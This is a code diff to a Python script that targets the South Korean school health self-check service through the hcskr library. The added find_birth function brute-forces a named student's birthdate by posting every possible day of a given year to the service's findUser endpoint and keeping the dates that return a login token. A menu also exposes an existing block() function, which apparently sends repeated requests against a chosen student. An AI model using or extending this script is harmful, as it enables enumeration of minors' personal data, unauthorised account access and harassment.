@@ -149,8 +149,66 @@
 
 import time
 import hcskr
+from hcskr.mapping import schoolinfo, encrypt
+import requests
 
-def main():
+
+def find_birth():
+      name = str(input('Name: '))
+      birth_year = str(input('Birth Year: '))
+      area = str(input('Area: '))
+      school_name = str(input('School Name: '))
+      school_level = str(input('School Level: '))
+
+      info = schoolinfo(area, school_level)
+
+      data = {
+            'ltcnScCode': info['schoolcode'],
+            'schulCrseScCode': info['schoollevel'],
+            'orgName': school_name,
+            'loginType': 'school'
+      }
+
+      schulList = requests.get(
+            'https://hcs.eduro.go.kr/v2/searchSchool',
+            data
+      ).json()['schulList']
+
+      for i, school in enumerate(schulList):
+            print(f'{i} : {school}\n')
+
+      choice = int(input('Choice : '))
+
+      org_code = schulList[choice]['orgCode']
+
+      result = []
+
+      for month in range(12):
+            for day in range(31):
+                  data = {
+                  'birthday': encrypt(f'{str(birth_year).zfill(2)}{str(month + 1).zfill(2)}{str(day + 1).zfill(2)}'),
+                  'loginType': 'school',
+                  'name': encrypt(name),
+                  'orgCode': org_code,
+                  'stdntPNo': None
+                  }
+
+                  res = requests.post(
+                        f'https://{info["schoolurl"]}hcs.eduro.go.kr/v2/findUser',
+                        json=data
+                  ).json()
+
+                  if 'token' in res.keys():
+                        result.append(f'{str(birth_year).zfill(2)}{str(month + 1).zfill(2)}{str(day + 1).zfill(2)}')
+
+                  print(f'\r{round((((day + 1) + (month) * 31)/(12 * 31)) * 100, 2)}%', end='')
+
+      print('')
+      for r in result:
+            print(r)
+
+
+def block():
       name = str(input('Name: '))
       birth = str(input('Birth: '))
       area = str(input('Area: '))
@@ -171,4 +229,12 @@ def main():
             count += 1
 
 
-main()
+choice = int(input('Find Birth(0) or Block(1) : '))
+
+if choice == 0:
+      find_birth()
+elif choice == 1:
+      block()
+else:
+      print('?')
+
